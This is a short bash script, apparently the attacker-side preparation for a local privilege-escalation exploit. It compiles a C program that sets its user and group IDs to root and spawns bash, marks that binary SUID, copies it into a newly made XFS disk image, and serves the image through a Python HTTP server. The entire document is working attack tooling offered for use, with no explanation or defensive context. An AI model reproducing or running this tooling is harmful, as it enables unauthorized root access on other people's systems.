#!/bin/bash

# Generate SUID-root shell
cat << EOF > rootshell.c
#include <unistd.h>
int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "sh", NULL);
    return 0;
}
EOF

gcc rootshell.c -o rootshell
chmod +s rootshell

# Create and format the XFS image
dd if=/dev/zero of=exploit.img bs=1M count=10
mkfs.xfs -f exploit.img

# Mount image, embed shell, and unmount
mkdir -p /tmp/mnt
sudo mount -o loop exploit.img /tmp/mnt
sudo cp rootshell /tmp/mnt/
sudo umount /tmp/mnt
rmdir /tmp/mnt

# Serve via Python HTTP server
echo "[*] Hosting exploit.img on port 8000"
python3 -m http.server 8000
